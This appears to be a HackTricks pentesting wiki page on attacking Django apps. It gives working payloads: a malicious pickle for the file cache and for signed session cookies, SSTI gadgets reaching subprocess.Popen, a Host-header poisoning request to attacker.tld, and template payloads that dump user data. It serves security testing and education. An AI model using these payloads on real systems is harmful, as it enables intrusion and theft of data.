---
title: "Django"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/django.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Cache Manipulation to RCE

Django’s default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.[\[11\]](#references)

Django cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache stored in a Redis server or database are the most likely attack vectors (Redis injection and SQL injection), but an attacker may also be able to use file-based cache to turn an arbitrary write into RCE. Maintainers have marked this as a non-issue. It’s important to note that the cache file folder, SQL table name, and Redis server details will vary based on implementation.

On **FileBasedCache**, the pickled value is written to a file under `CACHES['default']['LOCATION']` (often `/var/tmp/django_cache/`). If that directory is world-writable or attacker-controlled, dropping a malicious pickle under the expected cache key yields code execution when the app reads it:[\[8\]](#references)

```
python - <<'PY'
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```
This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436[\[12\]](#references)

## Host Header / Password Reset Poisoning

Django uses the request host to build absolute URLs in several common patterns: password reset emails, canonical links, redirects, `request.build_absolute_uri()`, sitemap generation, and multitenant logic. The framework validates the host only when code goes through `request.get_host()`. Therefore, **applications that read `request.META['HTTP_HOST']` or trust `HTTP_X_FORWARDED_HOST` in custom middleware can reintroduce classic Host header poisoning bugs even when `ALLOWED_HOSTS` is configured**.

### High-value targets

- Password reset and email verification links generated from `request.build_absolute_uri()`
- Cache keys or reverse-proxy cache variations that include the host
- Tenancy / white-label logic that picks branding, callback URLs, or storage buckets from the host
- CSRF logic in deployments with attacker-controlled subdomains or overly broad cookie domains

### Practical checks

```
POST /accounts/password/reset/ HTTP/1.1
Host: attacker.tld
X-Forwarded-Host: attacker.tld
X-Forwarded-Proto: https
```
Watch for:

- Reset links, absolute redirects, or preview URLs containing the injected host
- `SuspiciousOperation` only for`Host` , while`X-Forwarded-Host` still reaches application code
- Absolute URLs built from `request.META['HTTP_HOST']` instead of`request.get_host()`

Django’s own security docs explicitly note that fake Host values can be used for CSRF, cache poisoning, and poisoning links in emails, and that reading the host directly from `request.META` bypasses `ALLOWED_HOSTS` protection.<sup>[\[5\]](#references)</sup> Also remember the CSRF limitation: if an attacker controls a subdomain and can set cookies for the parent domain, they may be able to satisfy the CSRF cookie/token check for the main app.

## Server-Side Template Injection (SSTI)

The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.

### Detection

1. Look for dynamic calls to `Template()` /`Engine.from_string()` /`render_to_string()` that include*any* unsanitised request data.
2. Send a time-based or arithmetic payload:
 If the rendered output contains```
{{7*7}}
```
`49` the input is compiled by the template engine.
3. DTL is **not Jinja2** : arithmetic/loop payloads regularly raise`TemplateSyntaxError` /500 while still proving evaluation.<sup>[\[8\]](#references)</sup> Polyglots like`${{<%[%'"}}%` are good crash-or-render probes.

### [Context exfiltration when RCE is blocked](#context-exfiltration-when-rce-is-blocked)

Even if object-walking to `subprocess.Popen` fails, DTL still exposes in-scope objects:[\[8\]](#references)

```
{{ request }}               {# confirm SSTI #}
{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
{{ users }}                  {# QuerySet in the context? #}
{{ users.0 }}                {# first row #}
{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
```
`QuerySet.values()` coerces rows to dictionaries, bypassing `__str__` and exposing all fields returned by the queryset. This works even when direct Python execution is filtered.[\[4\]](#references)[\[8\]](#references)

**Automation pattern**: authenticate, grab the CSRF token, save a marker-prefixed payload in any persistent field (e.g., username/profile bio), then request a view that renders it (AJAX endpoints like `/likes/<id>` are common). Parse a stable attribute (e.g., `title="..."`) to recover the rendered result and iterate payloads.[\[8\]](#references)

### [Primitive to RCE](#primitive-to-rce)

Django blocks direct access to `__import__`, but the Python object graph is reachable:

```
{{''.__class__.mro()[1].__subclasses__()}}
```
Find the index of `subprocess.Popen` (≈400–500 depending on Python build) and execute arbitrary commands:

```
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
A safer universal gadget is to iterate until `cls.__name__ == 'Popen'`.

The same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input.

### [Also see: ReportLab/xhtml2pdf PDF export RCE](#also-see-reportlabxhtml2pdf-pdf-export-rce)

Applications built on Django commonly integrate xhtml2pdf/ReportLab to export views as PDF. When user-controlled HTML flows into PDF generation, rl_safe_eval may evaluate expressions inside triple brackets `[[[ ... ]]]` enabling code execution (CVE-2023-33733).<sup>[\[3\]](#references)</sup> Details, payloads, and mitigations:

[Reportlab Xhtml2pdf Triple Brackets Expression Evaluation Rce Cve 2023 33733](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.html)

## [Pickle-Backed Signed Session Cookie RCE](#pickle-backed-signed-session-cookie-rce)

If the application uses `SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'` together with `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` (or a custom serializer that deserialises pickle), Django will **unsign and unpickle attacker-controlled session data before view code runs**. In this configuration, a leaked `SECRET_KEY` immediately becomes an RCE primitive.

### [Exploit Requirements](#exploit-requirements)

- The server uses the signed-cookie session backend (`django.contrib.sessions.backends.signed_cookies` ).
- The server uses `PickleSerializer` .
- The attacker knows / can guess `settings.SECRET_KEY` (leaks via GitHub,`.env` , error pages, etc.).

### [Recon and tooling](#recon-and-tooling)

If the whole session is stored client-side, the `sessionid` cookie is usually a long signed blob rather than a short opaque session key from a server-side session store. That is the situation where `SECRET_KEY` guessing, reuse, or disclosure matters the most.

[`badsecrets`](https://github.com/blacklanternsecurity/badsecrets) can test Django signed cookies against known or weak secrets:[\[9\]](#references)[\[10\]](#references)

```
pip install badsecrets
badsecrets --url https://target.tld/
badsecrets '<sessionid_cookie_value>'
```
This is especially useful during wide scans for appliances or products that shipped with a hardcoded / tutorial `SECRET_KEY`, or after recovering a settings file from an LFI, debug page, or public repository.

### [Proof-of-Concept](#proof-of-concept)

```
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64
class RCE(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Send the resulting cookie, and the payload runs with the permissions of the WSGI worker.

**Mitigations**: keep the default `JSONSerializer`, rotate `SECRET_KEY`/`SECRET_KEY_FALLBACKS`, and leave `SESSION_COOKIE_HTTPONLY` enabled. Django’s own signing/session docs explicitly recommend JSON here because JSON serialization prevents pickle-based code execution even if the signing key is exposed.[\[6\]](#references)[\[7\]](#references)

## [Recent (2023-2025) High-Impact Django CVEs Pentesters Should Check](#recent-2023-2025-high-impact-django-cves-pentesters-should-check)

These are useful as **version-gated testing hints**, but the important lesson is broader: recent Django SQLi fixes keep landing in places where developers assume “ORM == safe” while still passing attacker-controlled field names, JSON keys, or alias names into `*args` / `**kwargs`.

- **CVE-2025-48432** –*Log injection via unescaped `request.path`* (fixed June 4 2025). Allows attackers to smuggle newlines/ANSI escape sequences into application logs and poison downstream log ingestion or analyst terminals. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.<sup>[\[1\]](#references)</sup>
- **CVE-2025-57833** –*SQL injection in `FilteredRelation` column aliases* (fixed September 3 2025). Dangerous pattern: attacker-controlled dictionary expansion into`QuerySet.annotate()` /`QuerySet.alias()` keyword arguments.<sup>[\[2\]](#references)</sup>
- **CVE-2024-42005** –*SQL injection in `QuerySet.values()` / `values_list()` on `JSONField`* (fixed August 6 2024). Dangerous pattern: attacker-controlled JSON keys reaching`values(*user_keys)` or`values_list(*user_keys)` .
- **CVE-2024-53908** –*SQL injection in direct `HasKey(lhs, rhs)` usage on Oracle* (fixed December 4 2024). The common`field__has_key='x'` syntax is unaffected; the risky case is hand-built lookup objects with untrusted`lhs` .

Always fingerprint the exact framework version via the `X-Frame-Options` error page, `/static/admin/css/base.css` hashes, package metadata leaks, or debug stack traces, then test the affected call sites where user input influences lookup names or alias names rather than raw values.

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
